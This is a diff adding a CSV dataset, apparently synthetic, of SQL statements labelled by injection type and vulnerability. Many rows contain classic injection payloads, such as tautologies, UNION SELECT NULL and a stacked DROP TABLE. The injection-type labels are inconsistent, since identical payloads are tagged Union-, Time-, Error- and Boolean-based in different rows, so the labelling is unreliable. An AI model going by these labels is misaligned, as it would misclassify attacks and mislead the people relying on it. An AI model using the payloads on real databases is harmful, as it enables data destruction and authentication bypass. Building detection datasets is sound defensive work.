@@ -1,0 +1,2154 @@
+SQL Query,Injection Type,Vulnerability Status
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Union-based,Yes
+SELECT * FROM users WHERE id = '100',None,No
+SELECT * FROM users WHERE id = '' OR '1'='1';--',Union-based,Yes
+SELECT email FROM customers WHERE email = '' UNION SELECT NULL',Error-based,Yes
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Time-based,Yes
+DELETE FROM orders WHERE order_id = apple,None,No
+SELECT email FROM customers WHERE email = '100 OR 1=1',Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM products WHERE name = '' UNION SELECT NULL',Boolean-based,Yes
+DELETE FROM orders WHERE order_id = 2,None,No
+SELECT * FROM products WHERE name = 'john.doe@example.com',None,No
+DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
+SELECT email FROM customers WHERE email = '100',None,No
+DELETE FROM orders WHERE order_id = 1,None,No
+UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Boolean-based,Yes
+SELECT * FROM users WHERE id = '2',None,No
+SELECT * FROM products WHERE name = 'apple',None,No
+SELECT * FROM users WHERE id = '100 OR 1=1',Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
+SELECT * FROM products WHERE name = 'apple',None,No
+UPDATE accounts SET balance=500 WHERE id=john.doe@example.com,None,No
+UPDATE accounts SET balance=500 WHERE id=apple,None,No
+SELECT * FROM products WHERE name = ''; DROP TABLE products;--',Error-based,Yes
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Time-based,Yes
+DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
+SELECT * FROM products WHERE name = '100',None,No
+SELECT email FROM customers WHERE email = '2',None,No
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Time-based,Yes
+SELECT * FROM products WHERE name = '' OR 1=1;--',Error-based,Yes
+SELECT * FROM users WHERE id = '1',None,No
+SELECT * FROM users WHERE id = '' OR '1'='1';--',Boolean-based,Yes
+DELETE FROM orders WHERE order_id = ' OR '1'='1';--,Boolean-based,Yes
+SELECT email FROM customers WHERE email = ''; DROP TABLE products;--',Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+DELETE FROM orders WHERE order_id = ' OR '1'='1';--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id = 2,None,No
+SELECT * FROM users WHERE id = '100 OR 1=1',Time-based,Yes
+SELECT email FROM customers WHERE email = '' UNION SELECT NULL',Time-based,Yes
+SELECT * FROM products WHERE name = '100',None,No
+SELECT * FROM products WHERE name = '100',None,No
+SELECT * FROM users WHERE id = '' OR '1'='1';--',Error-based,Yes
+DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
+DELETE FROM orders WHERE order_id = 100,None,No
+DELETE FROM orders WHERE order_id = apple,None,No
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+SELECT * FROM products WHERE name = '' UNION SELECT NULL',Time-based,Yes
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Error-based,Yes
+SELECT * FROM products WHERE name = '1',None,No
+SELECT * FROM users WHERE id = '' OR '1'='1';--',Boolean-based,Yes
+SELECT * FROM users WHERE id = '1',None,No
+DELETE FROM orders WHERE order_id = ' OR '1'='1';--,Union-based,Yes
+SELECT email FROM customers WHERE email = '100',None,No
+SELECT * FROM products WHERE name = '' UNION SELECT NULL',Union-based,Yes
+SELECT * FROM products WHERE name = '' UNION SELECT NULL',Boolean-based,Yes
+DELETE FROM orders WHERE order_id = 2,None,No
+DELETE FROM orders WHERE order_id = apple,None,No
+SELECT * FROM products WHERE name = 'apple',None,No
+UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id = 1,None,No
+UPDATE accounts SET balance=500 WHERE id=2,None,No
+DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
+DELETE FROM orders WHERE order_id = apple,None,No
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Time-based,Yes
+SELECT * FROM products WHERE name = '' OR '1'='1';--',Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Error-based,Yes
+DELETE FROM orders WHERE order_id = ' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Error-based,Yes
+SELECT * FROM users WHERE id = '' UNION SELECT NULL',Time-based,Yes
+SELECT * FROM products WHERE name = '' OR '1'='1';--',Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=john.doe@example.com,None,No
+UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Union-based,Yes
+SELECT email FROM customers WHERE email = 'apple',None,No
+SELECT * FROM users WHERE id = 'john.doe@example.com',None,No
+UPDATE accounts SET balance=500 WHERE id=2,None,No
+SELECT email FROM customers WHERE email = '1',None,No
+SELECT * FROM products WHERE name = '' UNION SELECT NULL',Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Boolean-based,Yes
+SELECT * FROM users WHERE id = 'john.doe@example.com',None,No
+SELECT * FROM products WHERE name = '2',None,No
+SELECT email FROM customers WHERE email = 'john.doe@example.com',None,No
+SELECT email FROM customers WHERE email = '100',None,No
+SELECT * FROM products WHERE name = 'john.doe@example.com',None,No
+SELECT email FROM customers WHERE email = ''; DROP TABLE products;--',Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+SELECT * FROM users WHERE id = '2',None,No
+SELECT * FROM users WHERE id = '' OR 1=1;--',Union-based,Yes
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Time-based,Yes
+SELECT * FROM products WHERE name = 'apple',None,No
+SELECT email FROM customers WHERE email = '1',None,No
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Union-based,Yes
+SELECT * FROM products WHERE name = 'john.doe@example.com',None,No
+UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Error-based,Yes
+DELETE FROM orders WHERE order_id = 1,None,No
+DELETE FROM orders WHERE order_id = 1,None,No
+SELECT email FROM customers WHERE email = '100 OR 1=1',Boolean-based,Yes
+SELECT email FROM customers WHERE email = 'john.doe@example.com',None,No
+SELECT * FROM users WHERE id = '1',None,No
+SELECT * FROM products WHERE name = '100',None,No
+SELECT * FROM users WHERE id = '' UNION SELECT NULL',Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+SELECT email FROM customers WHERE email = 'john.doe@example.com',None,No
+DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Error-based,Yes
+SELECT * FROM users WHERE id = '100 OR 1=1',Boolean-based,Yes
+SELECT * FROM users WHERE id = 'apple',None,No
+SELECT * FROM users WHERE id = '100',None,No
+SELECT * FROM users WHERE id = '1',None,No
+SELECT email FROM customers WHERE email = '' OR 1=1;--',Boolean-based,Yes
+SELECT email FROM customers WHERE email = '100',None,No
+SELECT email FROM customers WHERE email = ''; DROP TABLE products;--',Time-based,Yes
+SELECT email FROM customers WHERE email = '' OR 1=1;--',Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id=john.doe@example.com,None,No
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Error-based,Yes
+UPDATE accounts SET balance=500 WHERE id=2,None,No
+DELETE FROM orders WHERE order_id = ' OR '1'='1';--,Time-based,Yes
+SELECT * FROM users WHERE id = '' UNION SELECT NULL',Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Time-based,Yes
+DELETE FROM orders WHERE order_id = 100,None,No
+SELECT * FROM products WHERE name = '' UNION SELECT NULL',Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+SELECT * FROM products WHERE name = ''; DROP TABLE products;--',Union-based,Yes
+DELETE FROM orders WHERE order_id = 100 OR 1=1,Boolean-based,Yes
+DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=john.doe@example.com,None,No
+SELECT * FROM users WHERE id = '100',None,No
+SELECT email FROM customers WHERE email = '100 OR 1=1',Boolean-based,Yes
+SELECT email FROM customers WHERE email = '1',None,No
+UPDATE accounts SET balance=500 WHERE id=2,None,No
+SELECT * FROM products WHERE name = '100 OR 1=1',Time-based,Yes
+SELECT * FROM users WHERE id = '100 OR 1=1',Union-based,Yes
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+UPDATE accounts SET balance=500 WHERE id=100,None,No
+DELETE FROM orders WHERE order_id = 1,None,No
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Boolean-based,Yes
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Time-based,Yes
+SELECT * FROM products WHERE name = '100',None,No
+SELECT email FROM customers WHERE email = 'john.doe@example.com',None,No
+SELECT email FROM customers WHERE email = '100 OR 1=1',Error-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Union-based,Yes
+SELECT * FROM products WHERE name = '100 OR 1=1',Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Boolean-based,Yes
+SELECT email FROM customers WHERE email = 'john.doe@example.com',None,No
+SELECT email FROM customers WHERE email = ''; DROP TABLE products;--',Union-based,Yes
+SELECT * FROM products WHERE name = ''; DROP TABLE products;--',Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Boolean-based,Yes
+SELECT * FROM products WHERE name = '' UNION SELECT NULL',Boolean-based,Yes
+SELECT email FROM customers WHERE email = '2',None,No
+UPDATE accounts SET balance=500 WHERE id=apple,None,No
+UPDATE accounts SET balance=500 WHERE id=john.doe@example.com,None,No
+UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Boolean-based,Yes
+SELECT email FROM customers WHERE email = 'john.doe@example.com',None,No
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Error-based,Yes
+SELECT email FROM customers WHERE email = '100 OR 1=1',Error-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Time-based,Yes
+DELETE FROM orders WHERE order_id = ' OR '1'='1';--,Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Boolean-based,Yes
+SELECT email FROM customers WHERE email = '1',None,No
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Error-based,Yes
+SELECT * FROM products WHERE name = '100',None,No
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+SELECT * FROM products WHERE name = '1',None,No
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Union-based,Yes
+SELECT email FROM customers WHERE email = '' OR '1'='1';--',Time-based,Yes
+SELECT * FROM users WHERE id = '1',None,No
+SELECT * FROM users WHERE id = '1',None,No
+SELECT * FROM products WHERE name = '' UNION SELECT NULL',Error-based,Yes
+DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
+SELECT * FROM products WHERE name = '100',None,No
+DELETE FROM orders WHERE order_id = 1,None,No
+SELECT * FROM products WHERE name = ''; DROP TABLE products;--',Boolean-based,Yes
+SELECT * FROM products WHERE name = 'apple',None,No
+SELECT * FROM products WHERE name = 'john.doe@example.com',None,No
+SELECT email FROM customers WHERE email = 'apple',None,No
+UPDATE accounts SET balance=500 WHERE id=2,None,No
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Time-based,Yes
+SELECT email FROM customers WHERE email = '' OR 1=1;--',Union-based,Yes
+SELECT * FROM products WHERE name = '100 OR 1=1',Boolean-based,Yes
+SELECT * FROM users WHERE id = '' OR '1'='1';--',Boolean-based,Yes
+SELECT * FROM users WHERE id = '100',None,No
+SELECT email FROM customers WHERE email = '100',None,No
+SELECT * FROM users WHERE id = '' OR 1=1;--',Time-based,Yes
+SELECT * FROM products WHERE name = '' OR 1=1;--',Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id=100,None,No
+SELECT email FROM customers WHERE email = 'apple',None,No
+SELECT * FROM users WHERE id = '' OR '1'='1';--',Time-based,Yes
+SELECT email FROM customers WHERE email = '2',None,No
+SELECT * FROM users WHERE id = '2',None,No
+SELECT * FROM products WHERE name = '100 OR 1=1',Union-based,Yes
+SELECT email FROM customers WHERE email = '' OR '1'='1';--',Error-based,Yes
+SELECT * FROM users WHERE id = '100 OR 1=1',Boolean-based,Yes
+DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Time-based,Yes
+SELECT email FROM customers WHERE email = '' OR 1=1;--',Union-based,Yes
+SELECT * FROM products WHERE name = ''; DROP TABLE products;--',Time-based,Yes
+SELECT * FROM users WHERE id = '100',None,No
+SELECT * FROM users WHERE id = '2',None,No
+DELETE FROM orders WHERE order_id = '; DROP TABLE products;--,Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id=2,None,No
+SELECT * FROM products WHERE name = 'apple',None,No
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+SELECT * FROM products WHERE name = 'apple',None,No
+DELETE FROM orders WHERE order_id = apple,None,No
+SELECT email FROM customers WHERE email = '100',None,No
+SELECT email FROM customers WHERE email = '' OR 1=1;--',Union-based,Yes
+SELECT * FROM users WHERE id = '' OR '1'='1';--',Boolean-based,Yes
+SELECT * FROM users WHERE id = '1',None,No
+SELECT * FROM products WHERE name = '' OR '1'='1';--',Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=2,None,No
+SELECT * FROM users WHERE id = '2',None,No
+SELECT * FROM products WHERE name = '' OR 1=1;--',Union-based,Yes
+SELECT * FROM products WHERE name = '100 OR 1=1',Boolean-based,Yes
+SELECT email FROM customers WHERE email = '' UNION SELECT NULL',Boolean-based,Yes
+SELECT * FROM users WHERE id = '' OR 1=1;--',Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Boolean-based,Yes
+SELECT email FROM customers WHERE email = '100 OR 1=1',Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Boolean-based,Yes
+SELECT * FROM users WHERE id = '2',None,No
+DELETE FROM orders WHERE order_id = 100 OR 1=1,Time-based,Yes
+SELECT email FROM customers WHERE email = ''; DROP TABLE products;--',Boolean-based,Yes
+DELETE FROM orders WHERE order_id = 100 OR 1=1,Error-based,Yes
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Boolean-based,Yes
+SELECT * FROM products WHERE name = '' OR 1=1;--',Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Boolean-based,Yes
+SELECT * FROM products WHERE name = '' UNION SELECT NULL',Time-based,Yes
+SELECT * FROM users WHERE id = '1',None,No
+SELECT email FROM customers WHERE email = ''; DROP TABLE products;--',Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Union-based,Yes
+SELECT * FROM users WHERE id = '2',None,No
+SELECT * FROM users WHERE id = '' OR 1=1;--',Error-based,Yes
+SELECT * FROM users WHERE id = 'apple',None,No
+DELETE FROM orders WHERE order_id = 100,None,No
+SELECT email FROM customers WHERE email = '2',None,No
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Error-based,Yes
+SELECT * FROM products WHERE name = '100',None,No
+SELECT * FROM products WHERE name = '' OR 1=1;--',Error-based,Yes
+SELECT email FROM customers WHERE email = '1',None,No
+SELECT * FROM users WHERE id = '2',None,No
+SELECT * FROM products WHERE name = ''; DROP TABLE products;--',Union-based,Yes
+SELECT email FROM customers WHERE email = '' OR '1'='1';--',Boolean-based,Yes
+SELECT * FROM products WHERE name = 'john.doe@example.com',None,No
+SELECT * FROM products WHERE name = 'apple',None,No
+DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
+SELECT * FROM products WHERE name = 'john.doe@example.com',None,No
+SELECT * FROM users WHERE id = 'apple',None,No
+SELECT * FROM products WHERE name = '2',None,No
+DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Union-based,Yes
+SELECT * FROM users WHERE id = '' OR 1=1;--',Error-based,Yes
+SELECT email FROM customers WHERE email = '1',None,No
+UPDATE accounts SET balance=500 WHERE id=100,None,No
+SELECT email FROM customers WHERE email = '1',None,No
+UPDATE accounts SET balance=500 WHERE id=apple,None,No
+SELECT * FROM users WHERE id = 'john.doe@example.com',None,No
+SELECT email FROM customers WHERE email = 'apple',None,No
+DELETE FROM orders WHERE order_id = 1,None,No
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=100,None,No
+UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Time-based,Yes
+DELETE FROM orders WHERE order_id = 100,None,No
+UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Error-based,Yes
+SELECT * FROM users WHERE id = '' OR 1=1;--',Error-based,Yes
+SELECT email FROM customers WHERE email = '100',None,No
+SELECT * FROM users WHERE id = '' OR '1'='1';--',Boolean-based,Yes
+DELETE FROM orders WHERE order_id = 100,None,No
+SELECT * FROM products WHERE name = ''; DROP TABLE products;--',Error-based,Yes
+DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
+UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Error-based,Yes
+UPDATE accounts SET balance=500 WHERE id=apple,None,No
+UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Union-based,Yes
+SELECT email FROM customers WHERE email = '' OR 1=1;--',Error-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Union-based,Yes
+SELECT * FROM products WHERE name = '' OR '1'='1';--',Union-based,Yes
+SELECT * FROM users WHERE id = '' OR 1=1;--',Error-based,Yes
+SELECT * FROM users WHERE id = '1',None,No
+SELECT email FROM customers WHERE email = '1',None,No
+SELECT * FROM users WHERE id = '' OR 1=1;--',Boolean-based,Yes
+SELECT * FROM users WHERE id = 'john.doe@example.com',None,No
+DELETE FROM orders WHERE order_id = 1,None,No
+DELETE FROM orders WHERE order_id = ' OR '1'='1';--,Union-based,Yes
+SELECT email FROM customers WHERE email = ''; DROP TABLE products;--',Time-based,Yes
+SELECT * FROM users WHERE id = '2',None,No
+SELECT email FROM customers WHERE email = 'john.doe@example.com',None,No
+UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Error-based,Yes
+SELECT * FROM products WHERE name = '2',None,No
+SELECT * FROM products WHERE name = '2',None,No
+SELECT email FROM customers WHERE email = '100',None,No
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Error-based,Yes
+SELECT * FROM products WHERE name = 'john.doe@example.com',None,No
+SELECT * FROM users WHERE id = '100 OR 1=1',Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Error-based,Yes
+SELECT * FROM products WHERE name = '100 OR 1=1',Union-based,Yes
+SELECT * FROM users WHERE id = '' UNION SELECT NULL',Error-based,Yes
+DELETE FROM orders WHERE order_id = 100,None,No
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Error-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Error-based,Yes
+SELECT * FROM products WHERE name = '100',None,No
+SELECT email FROM customers WHERE email = '' UNION SELECT NULL',Time-based,Yes
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Time-based,Yes
+SELECT email FROM customers WHERE email = '2',None,No
+SELECT * FROM products WHERE name = '' OR '1'='1';--',Boolean-based,Yes
+SELECT email FROM customers WHERE email = '' OR 1=1;--',Boolean-based,Yes
+SELECT email FROM customers WHERE email = '' OR 1=1;--',Time-based,Yes
+SELECT email FROM customers WHERE email = '1',None,No
+SELECT email FROM customers WHERE email = '' UNION SELECT NULL',Union-based,Yes
+SELECT email FROM customers WHERE email = '100',None,No
+UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Union-based,Yes
+DELETE FROM orders WHERE order_id = 2,None,No
+SELECT * FROM users WHERE id = 'john.doe@example.com',None,No
+SELECT email FROM customers WHERE email = '100',None,No
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+SELECT email FROM customers WHERE email = '2',None,No
+UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Error-based,Yes
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Boolean-based,Yes
+SELECT * FROM users WHERE id = '' OR '1'='1';--',Boolean-based,Yes
+DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Boolean-based,Yes
+SELECT email FROM customers WHERE email = '' UNION SELECT NULL',Time-based,Yes
+SELECT * FROM users WHERE id = '1',None,No
+SELECT * FROM products WHERE name = ''; DROP TABLE products;--',Error-based,Yes
+SELECT * FROM users WHERE id = '100',None,No
+UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Time-based,Yes
+SELECT * FROM products WHERE name = ''; DROP TABLE products;--',Boolean-based,Yes
+SELECT * FROM users WHERE id = 'apple',None,No
+DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
+SELECT email FROM customers WHERE email = '2',None,No
+DELETE FROM orders WHERE order_id = ' OR '1'='1';--,Time-based,Yes
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Union-based,Yes
+SELECT * FROM users WHERE id = 'apple',None,No
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Union-based,Yes
+SELECT email FROM customers WHERE email = 'apple',None,No
+DELETE FROM orders WHERE order_id = apple,None,No
+UPDATE accounts SET balance=500 WHERE id=apple,None,No
+SELECT email FROM customers WHERE email = '' OR '1'='1';--',Error-based,Yes
+SELECT * FROM users WHERE id = '2',None,No
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Boolean-based,Yes
+SELECT * FROM users WHERE id = '1',None,No
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Time-based,Yes
+DELETE FROM orders WHERE order_id = 100 OR 1=1,Union-based,Yes
+SELECT email FROM customers WHERE email = '' UNION SELECT NULL',Time-based,Yes
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Union-based,Yes
+SELECT * FROM users WHERE id = 'apple',None,No
+SELECT * FROM products WHERE name = 'apple',None,No
+UPDATE accounts SET balance=500 WHERE id=100,None,No
+SELECT * FROM products WHERE name = '' OR '1'='1';--',Time-based,Yes
+SELECT * FROM products WHERE name = '100',None,No
+UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Error-based,Yes
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Error-based,Yes
+UPDATE accounts SET balance=500 WHERE id=2,None,No
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+SELECT * FROM products WHERE name = '' OR '1'='1';--',Boolean-based,Yes
+SELECT * FROM users WHERE id = '' OR '1'='1';--',Boolean-based,Yes
+SELECT email FROM customers WHERE email = '1',None,No
+DELETE FROM orders WHERE order_id = 2,None,No
+DELETE FROM orders WHERE order_id = ' OR '1'='1';--,Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=john.doe@example.com,None,No
+SELECT email FROM customers WHERE email = 'apple',None,No
+UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id = 2,None,No
+SELECT * FROM products WHERE name = '100 OR 1=1',Union-based,Yes
+SELECT email FROM customers WHERE email = '1',None,No
+SELECT * FROM products WHERE name = '2',None,No
+DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
+DELETE FROM orders WHERE order_id = 1,None,No
+UPDATE accounts SET balance=500 WHERE id=100,None,No
+SELECT * FROM products WHERE name = ''; DROP TABLE products;--',Union-based,Yes
+SELECT email FROM customers WHERE email = '1',None,No
+SELECT * FROM users WHERE id = '2',None,No
+DELETE FROM orders WHERE order_id = apple,None,No
+SELECT * FROM users WHERE id = '1',None,No
+UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Time-based,Yes
+SELECT * FROM products WHERE name = '1',None,No
+SELECT * FROM users WHERE id = '2',None,No
+SELECT * FROM users WHERE id = '1',None,No
+SELECT * FROM products WHERE name = '' OR '1'='1';--',Boolean-based,Yes
+DELETE FROM orders WHERE order_id = ' OR '1'='1';--,Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=2,None,No
+DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Union-based,Yes
+SELECT email FROM customers WHERE email = '100',None,No
+SELECT email FROM customers WHERE email = '1',None,No
+SELECT * FROM products WHERE name = '2',None,No
+DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Union-based,Yes
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Union-based,Yes
+SELECT email FROM customers WHERE email = '' OR 1=1;--',Union-based,Yes
+SELECT * FROM users WHERE id = '' OR '1'='1';--',Union-based,Yes
+SELECT email FROM customers WHERE email = '2',None,No
+SELECT * FROM users WHERE id = '' UNION SELECT NULL',Boolean-based,Yes
+DELETE FROM orders WHERE order_id = '; DROP TABLE products;--,Error-based,Yes
+SELECT email FROM customers WHERE email = '100',None,No
+SELECT * FROM users WHERE id = '100 OR 1=1',Error-based,Yes
+SELECT * FROM products WHERE name = 'apple',None,No
+SELECT * FROM users WHERE id = '100',None,No
+SELECT email FROM customers WHERE email = '' OR '1'='1';--',Union-based,Yes
+SELECT * FROM users WHERE id = '1',None,No
+UPDATE accounts SET balance=500 WHERE id=100,None,No
+SELECT * FROM products WHERE name = '' OR '1'='1';--',Error-based,Yes
+SELECT * FROM products WHERE name = '' UNION SELECT NULL',Time-based,Yes
+SELECT email FROM customers WHERE email = '2',None,No
+UPDATE accounts SET balance=500 WHERE id=2,None,No
+DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Union-based,Yes
+SELECT email FROM customers WHERE email = '' OR 1=1;--',Union-based,Yes
+SELECT * FROM products WHERE name = '1',None,No
+DELETE FROM orders WHERE order_id = 2,None,No
+SELECT email FROM customers WHERE email = '' UNION SELECT NULL',Union-based,Yes
+SELECT * FROM users WHERE id = '2',None,No
+DELETE FROM orders WHERE order_id = 100 OR 1=1,Error-based,Yes
+SELECT * FROM products WHERE name = '' OR 1=1;--',Time-based,Yes
+DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Union-based,Yes
+SELECT email FROM customers WHERE email = '' UNION SELECT NULL',Time-based,Yes
+DELETE FROM orders WHERE order_id = 1,None,No
+SELECT email FROM customers WHERE email = '100 OR 1=1',Boolean-based,Yes
+SELECT * FROM products WHERE name = '' UNION SELECT NULL',Boolean-based,Yes
+SELECT * FROM users WHERE id = '1',None,No
+SELECT * FROM users WHERE id = '' UNION SELECT NULL',Error-based,Yes
+SELECT email FROM customers WHERE email = ''; DROP TABLE products;--',Time-based,Yes
+DELETE FROM orders WHERE order_id = 100 OR 1=1,Boolean-based,Yes
+SELECT email FROM customers WHERE email = 'apple',None,No
+DELETE FROM orders WHERE order_id = ' OR '1'='1';--,Time-based,Yes
+SELECT * FROM users WHERE id = '' OR 1=1;--',Union-based,Yes
+SELECT email FROM customers WHERE email = '' OR 1=1;--',Time-based,Yes
+DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+SELECT email FROM customers WHERE email = '' UNION SELECT NULL',Union-based,Yes
+SELECT * FROM products WHERE name = '' UNION SELECT NULL',Error-based,Yes
+SELECT * FROM products WHERE name = '1',None,No
+SELECT * FROM products WHERE name = '100 OR 1=1',Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Error-based,Yes
+SELECT * FROM products WHERE name = '1',None,No
+SELECT * FROM products WHERE name = '' OR '1'='1';--',Time-based,Yes
+DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Error-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Boolean-based,Yes
+SELECT email FROM customers WHERE email = 'apple',None,No
+DELETE FROM orders WHERE order_id = 1,None,No
+SELECT * FROM products WHERE name = '' OR '1'='1';--',Error-based,Yes
+SELECT * FROM users WHERE id = '' OR 1=1;--',Union-based,Yes
+SELECT * FROM products WHERE name = '100 OR 1=1',Union-based,Yes
+SELECT * FROM users WHERE id = 'apple',None,No
+SELECT * FROM users WHERE id = '' OR 1=1;--',Boolean-based,Yes
+SELECT * FROM users WHERE id = '' OR '1'='1';--',Boolean-based,Yes
+SELECT * FROM users WHERE id = '100 OR 1=1',Error-based,Yes
+SELECT email FROM customers WHERE email = '2',None,No
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+SELECT email FROM customers WHERE email = '' OR '1'='1';--',Union-based,Yes
+SELECT * FROM products WHERE name = ''; DROP TABLE products;--',Union-based,Yes
